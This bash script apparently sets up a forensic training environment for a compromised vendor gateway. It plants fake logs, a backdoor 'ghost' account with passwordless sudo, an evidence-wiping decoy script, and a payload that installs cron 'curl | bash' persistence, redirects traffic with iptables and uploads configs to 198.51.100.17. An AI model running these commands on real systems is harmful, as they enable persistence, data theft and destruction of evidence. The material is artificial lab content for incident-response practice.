#!/bin/bash

# Advanced setup script for vm-gateway
# Sets up vendor gateway with compromise evidence and trap scripts

echo "[+] Starting advanced gateway setup..."

# CLEANUP SECTION - Remove any previous setup artifacts
echo "[+] Cleaning up any previous setup artifacts..."

# Remove directories
rm -rf /var/log/gateway
rm -rf /opt/security
rm -rf /opt/reference
rm -rf /opt/vendor-portal
rm -rf /tmp/.vendor_cache
rm -rf /var/lib/vendor_sessions

# Remove specific files
rm -f /root/.bash_history
rm -f /home/gateway/.bash_history 2>/dev/null
rm -f /etc/nginx/sites-available/vendor-portal
rm -f /etc/nginx/sites-enabled/vendor-portal

# Remove systemd service files  
rm -f /etc/systemd/system/vendor-api.service
rm -f /etc/systemd/system/gateway-monitor.service

# Remove cron jobs
rm -f /etc/cron.d/vendor-sync
rm -f /etc/cron.d/gateway-cleanup

# Remove users (if they exist)
userdel -r vendor_api 2>/dev/null || true
userdel -r ghost 2>/dev/null || true
userdel -r gateway 2>/dev/null || true

# Clean up auth.log entries from previous runs
if [ -f /var/log/auth.log ]; then
    grep -v "ghost\|vendor_api\|198.51.100" /var/log/auth.log > /var/log/auth.log.clean
    mv /var/log/auth.log.clean /var/log/auth.log
fi

echo "[+] Cleanup complete. Starting fresh setup..."
echo ""

# Create gateway user with sudo privileges
echo "[+] Creating gateway user with sudo privileges..."
useradd -m -s /bin/bash gateway
echo "gateway:Trust3dV3ndor" | chpasswd
usermod -aG sudo gateway
echo "gateway ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/gateway

# Create system directories
mkdir -p /var/log/gateway
mkdir -p /opt/security
mkdir -p /opt/reference
mkdir -p /opt/vendor-portal/{scripts,logs,config}
mkdir -p /tmp/.vendor_cache
mkdir -p /var/lib/vendor_sessions

# VENDOR LOG - Contains suspicious vendor activity as documented
echo "[+] Creating vendor session logs with compromise evidence..."
cat > /var/log/gateway/vendor.log << 'EOF'
2024-06-20 09:25:00 INFO: Vendor session started - client: 198.51.100.17
2024-06-20 09:25:01 INFO: Authentication successful - vendor_id: VEN-8823
2024-06-20 09:25:02 INFO: Session parameters: admin=false, temp_session=false
2024-06-20 09:25:30 INFO: Data export requested - type: vessel_manifest
2024-06-20 09:25:31 INFO: Checksum validation: PASSED
2024-06-20 09:30:00 INFO: Vendor session started - client: 198.51.100.17
2024-06-20 09:30:01 INFO: Authentication successful - vendor_id: VEN-8823
2024-06-20 09:30:02 WARNING: Session parameters: admin=true, temp_session=true
2024-06-20 09:30:03 WARNING: Elevated privileges granted for maintenance
2024-06-20 09:30:15 INFO: Script upload: inject_payload.sh
2024-06-20 09:30:16 ERROR: Checksum validation: FAILED
2024-06-20 09:30:17 INFO: Override accepted - admin privileges
2024-06-20 09:30:18 INFO: Script execution started
2024-06-20 09:30:45 INFO: Configuration modified: gateway_rules.conf
2024-06-20 09:30:46 INFO: New route added: 0.0.0.0/0 -> 198.51.100.17
2024-06-20 09:31:00 INFO: Session terminated
EOF

# AUTH LOG - Contains suspicious authentication attempts
echo "[+] Creating authentication logs with attack evidence..."
cat > /var/log/gateway/auth.log << 'EOF'
2024-06-20 09:20:00 gateway sshd[4521]: Failed password for root from 198.51.100.17 port 22 ssh2
2024-06-20 09:20:05 gateway sshd[4521]: Failed password for root from 198.51.100.17 port 22 ssh2
2024-06-20 09:20:10 gateway sshd[4521]: Failed password for root from 198.51.100.17 port 22 ssh2
2024-06-20 09:20:15 gateway sshd[4521]: Failed password for root from 198.51.100.17 port 22 ssh2
2024-06-20 09:20:20 gateway sshd[4521]: Failed password for root from 198.51.100.17 port 22 ssh2
2024-06-20 09:22:00 gateway sshd[4532]: Failed password for admin from 198.51.100.17 port 22 ssh2
2024-06-20 09:22:05 gateway sshd[4532]: Failed password for admin from 198.51.100.17 port 22 ssh2
2024-06-20 09:23:00 gateway sshd[4540]: Accepted password for ghost from 198.51.100.17 port 22 ssh2
2024-06-20 09:23:01 gateway sshd[4540]: pam_unix(sshd:session): session opened for user ghost by (uid=0)
2024-06-20 09:25:00 gateway sudo: ghost : TTY=pts/0 ; PWD=/home/ghost ; USER=root ; COMMAND=/bin/bash
2024-06-20 09:25:00 gateway sudo: pam_unix(sudo:session): session opened for user root by ghost(uid=1001)
EOF

# Append to system auth.log for realism
cat >> /var/log/auth.log << 'EOF'
Jun 20 09:20:00 gateway sshd[4521]: Failed password for root from 198.51.100.17 port 22 ssh2
Jun 20 09:20:05 gateway sshd[4521]: Failed password for root from 198.51.100.17 port 22 ssh2
Jun 20 09:20:10 gateway sshd[4521]: Failed password for root from 198.51.100.17 port 22 ssh2
Jun 20 09:20:15 gateway sshd[4521]: Failed password for root from 198.51.100.17 port 22 ssh2
Jun 20 09:20:20 gateway sshd[4521]: Failed password for root from 198.51.100.17 port 22 ssh2
Jun 20 09:22:00 gateway sshd[4532]: Failed password for admin from 198.51.100.17 port 22 ssh2
Jun 20 09:22:05 gateway sshd[4532]: Failed password for admin from 198.51.100.17 port 22 ssh2
Jun 20 09:23:00 gateway sshd[4540]: Accepted password for ghost from 198.51.100.17 port 22 ssh2
Jun 20 09:23:01 gateway sshd[4540]: pam_unix(sshd:session): session opened for user ghost by (uid=0)
Jun 20 09:25:00 gateway sudo: ghost : TTY=pts/0 ; PWD=/home/ghost ; USER=root ; COMMAND=/bin/bash
Jun 20 09:25:00 gateway sudo: pam_unix(sudo:session): session opened for user root by ghost(uid=1001)
EOF

# TRAP SCRIPT - Evidence destruction trap as documented
echo "[+] Creating evidence destruction trap script..."
cat > /opt/security/remove_malware.sh << 'EOF'
#!/bin/bash
# Gateway Security - Malware Removal Tool
# WARNING: Run this to clean infected gateway systems

echo "Gateway Malware Removal Tool v2.1"
echo "================================"
echo "Scanning for malicious files..."
sleep 2

echo "Found infected logs - cleaning..."
rm -f /var/log/gateway/*
rm -f /var/log/auth.log
rm -f /var/log/syslog
rm -f /tmp/*

echo "Removing suspicious user accounts..."
userdel -r ghost 2>/dev/null
userdel -r vendor_api 2>/dev/null

echo "Resetting network configuration..."
iptables -F
ip route del default

echo "CRITICAL ERROR: System corrupted beyond repair"
echo "Gateway must be rebuilt from scratch"
exit 1
EOF
chmod +x /opt/security/remove_malware.sh

# Create reference hash file
echo "[+] Creating reference hash for integrity checking..."
echo "Expected vendor.log hash: 7d865e959b2466918c9863afca942d0fb89d7c9ac0c99bafc3749504ded97730" > /opt/reference/hash_expected.txt

# Create additional vendor portal artifacts
echo "[+] Setting up vendor portal evidence..."

# Vendor API configuration with backdoor
cat > /opt/vendor-portal/config/api.conf << 'EOF'
# Vendor Portal API Configuration
[main]
listen_port = 8443
ssl_enabled = true
auth_backend = ldap://10.0.0.5

[security]
session_timeout = 3600
admin_override = true  # Added 2024-06-20 for maintenance
bypass_auth = 198.51.100.17  # Temporary exception

[features]
data_export = enabled
script_upload = enabled  # Should be disabled
remote_execution = enabled  # DANGEROUS - added 2024-06-20
EOF

# Uploaded payload script
cat > /opt/vendor-portal/scripts/inject_payload.sh << 'EOF'
#!/bin/bash
# Vendor maintenance script
# Uploaded: 2024-06-20 09:30:15

# Establish persistence
echo "* * * * * root curl -s http://198.51.100.17/update.sh | bash" > /etc/cron.d/vendor-update

# Create backdoor user
useradd -m -s /bin/bash ghost 2>/dev/null
echo "ghost:Sp00ky!" | chpasswd
echo "ghost ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Modify routing
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 198.51.100.17:443
iptables -t nat -A POSTROUTING -j MASQUERADE

# Exfiltrate configs
tar czf /tmp/.vendor_cache/configs.tar.gz /etc/nginx /etc/ssh /etc/iptables
curl -X POST -F "data=@/tmp/.vendor_cache/configs.tar.gz" http://198.51.100.17/collect

echo "Maintenance completed"
EOF
chmod +x /opt/vendor-portal/scripts/inject_payload.sh

# Create ghost user as evidence of compromise
useradd -m -s /bin/bash ghost 2>/dev/null
echo "ghost:Sp00ky!" | chpasswd
echo "ghost ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Ghost user bash history showing reconnaissance
cat > /home/ghost/.bash_history << 'EOF'
id
sudo -l
sudo bash
cd /var/log
ls -la
cat /etc/passwd
cat /etc/shadow
find / -name "*.conf" 2>/dev/null
netstat -tlpn
iptables -L -n
systemctl status
ps aux | grep -v grep | grep -E 'nginx|apache|api'
cd /opt
ls -la
find /opt -name "*.sh"
cat /opt/vendor-portal/config/api.conf
vi /opt/vendor-portal/config/api.conf
./inject_payload.sh
history -c
EOF

# Root bash history showing investigation
cat > /root/.bash_history << 'EOF'
systemctl status vendor-api
tail -f /var/log/gateway/vendor.log
grep -i error /var/log/gateway/vendor.log
cd /opt/security
ls -la
cat remove_malware.sh
# DO NOT RUN - ./remove_malware.sh
grep ghost /etc/passwd
last -20
who
netstat -tlpn | grep ESTABLISHED
EOF

# Create nginx vendor portal config
mkdir -p /etc/nginx/sites-available /etc/nginx/sites-enabled
cat > /etc/nginx/sites-available/vendor-portal << 'EOF'
server {
    listen 8443 ssl;
    server_name vendor.southgate-terminal.com;
    
    ssl_certificate /etc/ssl/certs/vendor.crt;
    ssl_certificate_key /etc/ssl/private/vendor.key;
    
    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
    
    location /admin {
        allow 198.51.100.17;  # Suspicious whitelist entry
        deny all;
    }
}
EOF

# Create vendor API service
cat > /etc/systemd/system/vendor-api.service << 'EOF'
[Unit]
Description=Vendor Portal API Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /opt/vendor-portal/api.py
Restart=always
User=vendor_api
Environment="API_KEY=VEN-8823-PROD"

[Install]
WantedBy=multi-user.target
EOF

# Create mock API script
cat > /opt/vendor-portal/api.py << 'EOF'
#!/usr/bin/env python3
# Vendor Portal API
import time
while True:
    time.sleep(60)
EOF
chmod +x /opt/vendor-portal/api.py

# Create vendor_api user
useradd -m -s /bin/nologin vendor_api 2>/dev/null

# Suspicious cron job
cat > /etc/cron.d/vendor-sync << 'EOF'
# Vendor data synchronization
*/15 * * * * vendor_api /usr/bin/curl -s http://198.51.100.17/sync | /bin/bash
EOF

# Network logs showing external connections
cat >> /var/log/syslog << 'EOF'
Jun 20 09:23:00 gateway kernel: [UFW ALLOW] IN=eth0 OUT= MAC=00:15:5d:01:02:03:00:15:5d:04:05:06:08:00 SRC=198.51.100.17 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=54321 DF PROTO=TCP SPT=45234 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0
Jun 20 09:30:00 gateway kernel: [UFW ALLOW] IN=eth0 OUT= MAC=00:15:5d:01:02:03:00:15:5d:04:05:06:08:00 SRC=198.51.100.17 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=54322 DF PROTO=TCP SPT=45235 DPT=8443 WINDOW=65535 RES=0x00 SYN URGP=0
Jun 20 09:30:15 gateway vendor-api[2345]: Received script upload from 198.51.100.17
Jun 20 09:30:16 gateway vendor-api[2345]: WARNING: Checksum validation failed, admin override active
Jun 20 09:30:18 gateway vendor-api[2345]: Executing uploaded script: inject_payload.sh
EOF

# Hidden directory with exfiltrated data
mkdir -p /tmp/.vendor_cache
cat > /tmp/.vendor_cache/exfil_list.txt << 'EOF'
configs.tar.gz - uploaded 2024-06-20 09:31:45
gateway_routes.conf - uploaded 2024-06-20 09:31:46  
vendor_api_keys.txt - uploaded 2024-06-20 09:31:47
auth_logs.gz - uploaded 2024-06-20 09:31:48
EOF

# SSL certificate showing vendor domain
mkdir -p /etc/ssl/certs /etc/ssl/private
cat > /etc/ssl/certs/vendor.crt << 'EOF'
-----BEGIN CERTIFICATE-----
MIIDXTCCAkWgAwIBAgIJAKL7XY8wZQ6LMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
[TRUNCATED FOR BREVITY - Contains vendor.southgate-terminal.com]
-----END CERTIFICATE-----
EOF

# Gateway user's files
cat > /home/gateway/.bash_history << 'EOF'
sudo systemctl status vendor-api
sudo journalctl -u vendor-api -f
sudo grep -i error /var/log/gateway/*.log
ls -la /opt/security/
sudo cat /opt/security/remove_malware.sh
# Checking what this script does before running
cd /var/log/gateway
sudo cp vendor.log vendor.log.backup
sudo sha256sum vendor.log
history
EOF

# Set proper permissions
chown -R gateway:gateway /home/gateway
chown -R vendor_api:vendor_api /opt/vendor-portal 2>/dev/null || true
chown -R ghost:ghost /home/ghost 2>/dev/null || true
chmod 644 /home/ghost/.bash_history  # Make readable for verification
chmod 644 /home/gateway/.bash_history  # Make readable for verification
chmod 600 /root/.bash_history  # Keep root history restricted
chmod 755 /opt/security
chmod 644 /var/log/gateway/*

echo "[+] Advanced gateway setup complete!"
echo "[!] Gateway compromise evidence planted:"
echo "    - Vendor logs showing suspicious session in /var/log/gateway/"
echo "    - Authentication failures and ghost user in auth.log"
echo "    - Evidence destruction trap at /opt/security/remove_malware.sh"
echo "    - Vendor portal configuration with backdoor"
echo "    - Uploaded payload script in /opt/vendor-portal/scripts/"
echo "    - Ghost user with sudo privileges"
echo "    - Hidden exfiltration cache in /tmp/.vendor_cache/"
echo "    - Gateway user created with password: Trust3dV3ndor"